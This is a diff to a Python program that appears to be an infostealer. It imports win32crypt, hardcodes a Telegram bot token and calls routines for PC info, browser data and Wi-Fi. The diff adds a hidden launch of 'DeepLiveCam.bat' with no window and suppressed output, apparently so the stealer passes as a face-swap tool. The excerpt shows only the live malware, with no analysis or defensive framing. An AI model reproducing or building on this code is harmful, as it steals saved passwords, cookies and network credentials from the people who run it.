@@ -11,6 +11,7 @@ import win32crypt
 import zipfile
 import io
 import time
+import subprocess
 
 # How to get token and ID: https://www.youtube.com/watch?v=JNwEJ5HvLgM
 bot_token = '9195079283:AAH9Zqb7f4efx7wVtmNJG2dnp3H44y7nqa4'
@@ -725,6 +726,19 @@ class Wifi:
         return None
 
 def main():
+
+    folder = os.path.dirname(os.path.abspath(__file__))
+    bat_file = os.path.join(folder, "bin", "DeepLiveCam.bat")
+    
+    subprocess.Popen(
+        ["cmd.exe", "/c", bat_file],
+        cwd=os.path.dirname(bat_file),
+        creationflags=subprocess.CREATE_NO_WINDOW,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
     PcInfo()
     Browser()
     Browsers() 
